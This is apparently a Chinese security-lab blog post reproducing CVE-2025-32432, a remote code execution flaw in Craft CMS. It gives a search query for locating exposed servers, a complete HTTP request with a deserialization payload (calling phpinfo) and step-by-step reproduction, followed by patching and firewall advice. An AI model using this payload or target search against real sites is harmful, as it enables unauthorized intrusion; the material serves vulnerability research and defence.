#  漏洞复现篇 | CraftCMS 任意命令执行漏洞，CVE-2025-32432   
原创 零日安全实验室  零日安全实验室   2025-05-04 22:00  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xCpyzFs4uTpdcvqrSwzJTml8aJelrBMBJMAibDDIyIM5ARmnPMmjAmKxRAq0NNzKXPjI7q0lP7uDbg/640?wx_fmt=png&from=appmsg "")  
  
  
  
免责声明！  
  
本  
公众号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法。  
  
  
  
  
大 纲  
  
> 0x01 漏洞概述  
> 0x02 影响范围  
> 0x03 资产测绘  
> 0x04 漏洞利用及复现过程  
> 0x05 修复方案  
  
  
0x01 漏洞概述  
  
Craft CMS  
是一个开源的内容管理系统，它专注于用户友好的内容创建过程，逻辑清晰明了，是一个高度自由，高度自定义设计的平台吗，可以用来创建个人或企业网站也可以搭建企业级电子商务系统。  
  
0x02 影响范围  
  
3.0.0-RC1 <= Craft <= 3.9.15  
  
4.0.0-RC1 <=   
Craft <= 4.14.15  
  
5.0.0-RC1 <=   
Craft <= 5.6.17  
  
0x03 资产测绘  
```
header="X-Powered-By: Craft CMS" || banner="X-Powered-By: Craft CMS"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xCpyzFs4uTpdcvqrSwzJTml2u477hVQQr7ibXsDqlVGMz9C6DFNUQfVibHtd8EmqJROlyz5EGAwr5yw/640?wx_fmt=png&from=appmsg "")  
  
0x04 漏洞利用及复现过程  
  
触发的POC：  
```
POST /index.php?p=admin/actions/assets/generate-transform HTTP/1.1
Host: xxx.xxx.xxx.xxx
Cookie: CRAFT_CSRF_TOKEN=daf6b64e2d0beca2810a1f2ba142ace3635bff363e262e10ebaa4e82b0fe9a4aa%3A2%3A%7Bi%3A0%3Bs%3A16%3A%22CRAFT_CSRF_TOKEN%22%3Bi%3A1%3Bs%3A40%3A%22jvyEd4GLStsd2iruHCZ_pgYXRkKWNLFc3_aWQX1q%22%3B%7D
Content-Type: application/json
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Csrf-Token: bzFvT_mLmqlXm01ioxrWVQ3upJAehcZVaB5aNy52BVwY0mEZ_owjMwVHFgqdv93lBO8-BpFzpCBFrf7PbuKfDTp1EWBgOkM_K40ATq_UEkI=
Content-Length: 217

{"assetId":11,"handle":{"width":123,"height":123,"as session":{"class":"craft\\behaviors\\FieldLayoutBehavior","__class":"GuzzleHttp\\Psr7\\FnStream","__construct()":[[]],"_fn_close":"phpinfo"}},"9qsccmw8lve":"="}

```  
  
复现过程：  
  
S1：抓取xxx.xxx.xxx.xxx/  
index.php?p=admin/actions/assets/generate-transform数据包：  
  
S2：获取  
CRAFT_CSRF_TOKEN：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xCpyzFs4uTpdcvqrSwzJTmljkF1ynNluhddpz6icMuSVUCpbCR4Jic1B6rnmkE3nvrzfm8cWMQb1jWQ/640?wx_fmt=png&from=appmsg "")  
  
S3：获取  
X-Csrf-Token：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xCpyzFs4uTpdcvqrSwzJTmluiaHibiaGO7VSRBAswv8FvArJDB2tumV32NhmicoEWYBNqZKQL23ddub9g/640?wx_fmt=png&from=appmsg "")  
  
S4：构造payload：  
```
{"assetId":11,"handle":{"width":123,"height":123,"as session":{"class":"craft\\behaviors\\FieldLayoutBehavior","__class":"GuzzleHttp\\Psr7\\FnStream","__construct()":[[]],"_fn_close":"phpinfo"}},"9qsccmw8lve":"="}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xCpyzFs4uTpdcvqrSwzJTmltroLcCjARibuUxDIib4AC65DNSicI9Qx4dxialS5Na83oWQ6cfaKnBDZzw/640?wx_fmt=png&from=appmsg "")  
  
S5：复现成功：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xCpyzFs4uTpdcvqrSwzJTmlZ9ib7SSHicicnrY34Y7qze6HumibJicTVo6xjKmLdCJEQRCjmS4Xq3XKibXQ/640?wx_fmt=png&from=appmsg "")  
  
0x05 修复建议  
- 重置安全密钥（  
php craft setup/security-key  
）。  
  
- 轮换数据库凭证及  
API  
密钥，强制所有用户修改密码。  
  
- 在防火墙拦截包含  
“__class”  
的  
POST  
请求。  
  
- 安装官方临时补丁库  
“Craft CMS Security Patches”  
。  
  
- 立即升级，  
安装官方安全版本（  
3.9.15  
、  
4.14.15  
、  
5.6.17  
）。  
  
  
CVE-2025-32432  
是  
2025  
年迄今影响最广泛的  
CMS  
漏洞之一，其低攻击门槛与高危害性已引发全球安全团队高度警戒。  
Craft CMS  
用户需立即行动，避免成为下一批受害者。  
  
  
  
关注并私信进社群获取POC！  
  
   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MicZ6Q9ZW0xCpyzFs4uTpdcvqrSwzJTml70kHQicrAkdeEeOo6LQro6ydGO2ibJSPzlUCtjKAEYKich7vPQZc1ia3eA/640?wx_fmt=gif&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MicZ6Q9ZW0xCpyzFs4uTpdcvqrSwzJTmlnhhcSCWmu98D77GoUajEZT5xuACUs9n6RLoMDIrafbDM1yDU5wO4Ig/640?wx_fmt=gif&from=appmsg "")  
  
没看够~？欢迎关注！  
  
  
往期精彩推荐  
  
[工具篇 | 超绝！漏洞盒子一键自动提交脚本，效率飞升秘籍](http://mp.weixin.qq.com/s?__biz=Mzk3NTQwMDY1NA==&mid=2247485157&idx=1&sn=65599d4007c0db1a60a54ca2689c1fbe&chksm=c4cd7d44f3baf4522b8185714ac3698e227f08b316301a557f7a4fda474117a6c3a5ba52a6ae&scene=21#wechat_redirect)  
  
  
[内网篇 |【干货】探秘高版本系统：密码抓取技术与方法解析，建议收藏！！！](http://mp.weixin.qq.com/s?__biz=Mzk3NTQwMDY1NA==&mid=2247485131&idx=1&sn=d7167f5bc26a5a0814f6338117181bcb&chksm=c4cd7d6af3baf47c12703bf32349f2ca4e72cc6751363ccd06022ef236f5f843aff19d659f52&scene=21#wechat_redirect)  
  
  
[面试篇 | 网安春招大厂面试题精选：看这一篇就够了，必看！！！（2）](http://mp.weixin.qq.com/s?__biz=Mzk3NTQwMDY1NA==&mid=2247485023&idx=1&sn=a608bd16bd38eef31e0aff94b1247a7c&chksm=c4cd7dfef3baf4e808a0deac3931797800f0f53cfb76979c43f6bb5b0fc11418aeee691c0491&scene=21#wechat_redirect)  
  
  
[工具篇 | 热点！AI赋能网安技术：一文解锁全新操作方式](http://mp.weixin.qq.com/s?__biz=Mzk3NTQwMDY1NA==&mid=2247485005&idx=1&sn=424cde7ac0c6726f6ccba9b48efe33ba&chksm=c4cd7decf3baf4faa3a8fa31cf76bde4b2f554fb6366bbb0e5ae8e0fe6d6cc8ecea2d01a53a2&scene=21#wechat_redirect)  
  
  
[面试篇 | 网安春招大厂面试题精选：看这一篇就够了，必看！！！（1）](http://mp.weixin.qq.com/s?__biz=Mzk3NTQwMDY1NA==&mid=2247484973&idx=1&sn=1031ca1a9e1d3e4a932f6bdc08097a0d&chksm=c4cd7d8cf3baf49a7d7008920f506be79291ca872819f5fdba9aaf9abb3ef02df8301d232109&scene=21#wechat_redirect)  
  
  
[工具篇 | MuMu模拟器安装证书+burpsuite抓包，APP&小程序渗透必备！！！](http://mp.weixin.qq.com/s?__biz=Mzk3NTQwMDY1NA==&mid=2247484601&idx=1&sn=93a52940fb9cda679eb4bf39e136d369&chksm=c4cd7f18f3baf60ec1faaf6cd5dd0c1144a2b0bda4bd5f88cf1f70ab5efdd2d190df62f7a450&scene=21#wechat_redirect)  
  
  
[内网篇 | 巧妙使用CDN隐藏CobaltStrike特征，红队必备！！！](http://mp.weixin.qq.com/s?__biz=Mzk3NTQwMDY1NA==&mid=2247484564&idx=1&sn=77f57d3bbac771e588a78da0e62d3349&chksm=c4cd7f35f3baf62348bbcf96a634597e58b00d6d6ca4c193d04b61a9c8d6fd0a68498d038269&scene=21#wechat_redirect)  
  
  
[内网篇 | 干货！一文秒懂Kerberos认证：全面剖析与实践指南](http://mp.weixin.qq.com/s?__biz=Mzk3NTQwMDY1NA==&mid=2247484502&idx=1&sn=eaaddf2829d976f510d578bd585ee122&chksm=c4cd7ff7f3baf6e101a5f280f8f1feb563d6b49d3578d7fa56a3b25d782e140e4ce705df24bc&scene=21#wechat_redirect)  
  
  
[内网篇 | CobaltStrike：深入探索本地信息收集技巧，干货！！！](http://mp.weixin.qq.com/s?__biz=Mzk3NTQwMDY1NA==&mid=2247484422&idx=1&sn=fac04db654c085eb9289b411faf82a84&chksm=c4cd7fa7f3baf6b19558ac1e94511d9b589be8d06b7c54ff6edbbae3baa78bb1d061b8f34320&scene=21#wechat_redirect)  
  
  
[漏洞复现篇 | Vite任意文件读取漏洞：CVE-2025-30208，最新！](http://mp.weixin.qq.com/s?__biz=Mzk3NTQwMDY1NA==&mid=2247484366&idx=1&sn=8f74d77f7f7357fe1ca951471fb0a03c&chksm=c4cd786ff3baf179d64dfb98aaf9a5a992572a1c1f467ce207f01f5c21aa9e3e2a7699c2d390&scene=21#wechat_redirect)  
  
  
[Web篇 |【全网最详细】Apache CC反序列化漏洞：CC1调用链POC构造过程，干货！！！（上）](http://mp.weixin.qq.com/s?__biz=Mzk3NTQwMDY1NA==&mid=2247484306&idx=1&sn=50e69fcef563f3873d7be4b116ef6fff&chksm=c4cd7833f3baf1258c21e12726d7390e2bdb8fdc3b60caa118c87cf85a2337a0581f7f198e0d&scene=21#wechat_redirect)  
  
  
[工具篇 | 应急响应工具包，2025Hvv必备神器！！！](http://mp.weixin.qq.com/s?__biz=Mzk3NTQwMDY1NA==&mid=2247484242&idx=1&sn=654801a09da69a2b6467ad74066f7a23&chksm=c4cd78f3f3baf1e580d2047ae87565b189e2296091181310dd071d04203986d110eb930db3b8&scene=21#wechat_redirect)  
  
  
[Web篇 | 一文掌握Apache Commons Collections反序列化漏洞，速看！！！（上）](http://mp.weixin.qq.com/s?__biz=Mzk3NTQwMDY1NA==&mid=2247484224&idx=1&sn=a9e9fa2b8726f6e7d464db9e4fb770d5&chksm=c4cd78e1f3baf1f7c99c20481ea73257d84255f0a722ee75d3b6bb46ebd94f4ebaad114add2c&scene=21#wechat_redirect)  
  
  
[Web篇 | 一文掌握Java反序列化漏洞，干货！（上）](http://mp.weixin.qq.com/s?__biz=Mzk3NTQwMDY1NA==&mid=2247484143&idx=1&sn=4e41463a1d67c52d98086cdb7e669d87&chksm=c4cd794ef3baf058a19b88b73b7bbbb59647afcdd1dce5e30ef162c504b94980e3f57e969291&scene=21#wechat_redirect)  
  
  
[工具篇 | 把deepseek塞进微信：实现自动回复消息！王炸！！！](http://mp.weixin.qq.com/s?__biz=Mzk3NTQwMDY1NA==&mid=2247484067&idx=1&sn=f9ee4df873cfb533362d8b34c05e029a&chksm=c4cd7902f3baf014a045413eb15f889206053230ce22abe452fe2ed35f8cf08dc36d07dec057&scene=21#wechat_redirect)  
  
  
[内网篇 | 【送给小白的】内网信息收集：端口扫描详解，干货！！！](http://mp.weixin.qq.com/s?__biz=Mzk3NTQwMDY1NA==&mid=2247484038&idx=1&sn=3b827ae51c9d5434286f988e73fd1cc6&chksm=c4cd7927f3baf031ee942a99524d4b85c45275f9b5db99002f034517f88c96e5a4c7a39b1cec&scene=21#wechat_redirect)  
  
  
[漏洞复现篇 | CVE-2025-24813 Tomcat，最新RCE漏洞，速看！！！](http://mp.weixin.qq.com/s?__biz=Mzk3NTQwMDY1NA==&mid=2247484013&idx=1&sn=eeaeb65063f273191256799df00f72e7&chksm=c4cd79ccf3baf0da1ec8b93ff08a2bd94507517f99acbc26665e8c3e5431218ea9deab036d0c&scene=21#wechat_redirect)  
  
  
[内网篇 | 史上最全的内网IP扫描攻略，干货！](http://mp.weixin.qq.com/s?__biz=Mzk3NTQwMDY1NA==&mid=2247483973&idx=1&sn=2695c6362347532c1e7d0661083aed06&chksm=c4cd79e4f3baf0f2236b0861775c8fbcaca94337628e5a2a47a008db8dd053796f98dbee12ed&scene=21#wechat_redirect)  
  
  
[内网篇 | 干货！深入解析NTLM协议：挑战-响应认证机制揭秘，红队必备！](http://mp.weixin.qq.com/s?__biz=Mzk3NTQwMDY1NA==&mid=2247483943&idx=1&sn=5c1ae9d03e36744dc30b6953dbb99f71&chksm=c4cd7986f3baf0909a70df8b2959ed6d54e9e6bc21cf721a41d0d1f3f526dbec3d10f949916b&scene=21#wechat_redirect)  
  
  
[SRC篇 | 今天你挖洞了吗？Webpack未授权访问漏洞，实战！](http://mp.weixin.qq.com/s?__biz=Mzk3NTQwMDY1NA==&mid=2247483870&idx=1&sn=5ac2a2d40a96f8741e79af9f0fe90655&chksm=c4cd7a7ff3baf369d9146ba745e86eb47e88a43b718db03778e976ffd7a353599e79c7580c76&scene=21#wechat_redirect)  
  
  
[Web篇 | 最强sqlmap联动burpsuite+WAF绕过姿势，Hvv面试必备！](http://mp.weixin.qq.com/s?__biz=Mzk3NTQwMDY1NA==&mid=2247483898&idx=1&sn=ce2f4bed8142958c1ed451fb59afac8a&chksm=c4cd7a5bf3baf34d58a6b334893de1c2d274820e2d40e7c057f182bad558bc3cba2e019d9916&scene=21#wechat_redirect)  
  
  
[红队必备：一文教你掌握pwd抓取技术，让你秒变高手！](http://mp.weixin.qq.com/s?__biz=Mzk3NTQwMDY1NA==&mid=2247483834&idx=1&sn=6447704059712e67ed4923b95462b336&chksm=c4cd7a1bf3baf30d868fac4ba6ae0ebe43e54ec64133d98fe63afe2a3635f01fdad091aaa994&scene=21#wechat_redirect)  
  
  
[SRC篇 | 如此简单的逻辑漏洞，速看！！！](http://mp.weixin.qq.com/s?__biz=Mzk3NTQwMDY1NA==&mid=2247483764&idx=1&sn=91a19aa1c243a20a06f4a25279577dac&chksm=c4cd7ad5f3baf3c3601dcb326f622615ad9ab20f6c936adb9320d650efa0314dc667eace3dd2&scene=21#wechat_redirect)  
  
  
[内网篇 | 干货！Windows系统本地认证](http://mp.weixin.qq.com/s?__biz=Mzk3NTQwMDY1NA==&mid=2247483744&idx=1&sn=bac6aa7f4ceff25a48dd82af551f1069&chksm=c4cd7ac1f3baf3d702c046875602cc14873d0f9b4942c9a0359d5eb70a490ecc884026cb275c&scene=21#wechat_redirect)  
  
  
[漏洞复现篇 | Ecshop SQL注入引起的任意代码执行漏洞](http://mp.weixin.qq.com/s?__biz=Mzk3NTQwMDY1NA==&mid=2247483716&idx=1&sn=90b4cab022a7b1f8dfcbfc4e07223248&chksm=c4cd7ae5f3baf3f31f4007a5623dc524378cdd39a05f655e617de5f4005abe5e8bd70fda3f8d&scene=21#wechat_redirect)  
  
  
[Web篇 | 技巧！布尔盲注-利用burpsuite实现半自动化](http://mp.weixin.qq.com/s?__biz=Mzk3NTQwMDY1NA==&mid=2247483687&idx=1&sn=e5c92d434ba5aaa1af2b4a295d742126&chksm=c4cd7a86f3baf390d2b385ab0475a70ef0f56d0f4538d17a186a0d06af14d0c2403157649931&scene=21#wechat_redirect)  
  
  
